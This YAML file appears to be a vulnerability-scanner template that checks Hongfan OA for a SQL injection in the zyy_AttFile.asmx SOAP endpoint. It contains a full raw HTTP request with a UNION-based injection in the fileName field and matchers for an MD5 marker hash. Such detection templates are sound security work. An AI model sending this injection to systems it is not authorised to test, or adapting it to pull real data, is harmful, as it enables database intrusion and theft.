folder-1/CVD-2023-1265.yaml

id: hongfan-oa-sql-injection
info:
  name: Hongfan OA zyy_AttFile.asmx File SQL Injection
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Hongfan OA contains a SQL injection vulnerability in the `zyy_AttFile.asmx` endpoint when processing `fileName` parameter inside the SOAP body. Attackers can exploit this to retrieve sensitive database information.
  reference:
    - http://www.hongfan.cn
  tags: sqli
  classification:
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
http:
  - raw:
      - |
        POST /ioffice/prg/interface/zyy_AttFile.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetFileAtt"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetFileAtt xmlns="http://tempuri.org/">
              <fileName>123' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','82161')),3,32)-- aCWL</fileName>
            </GetFileAtt>
          </soap:Body>
        </soap:Envelope>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "3648099174dfbd954311cf9899b21d23"
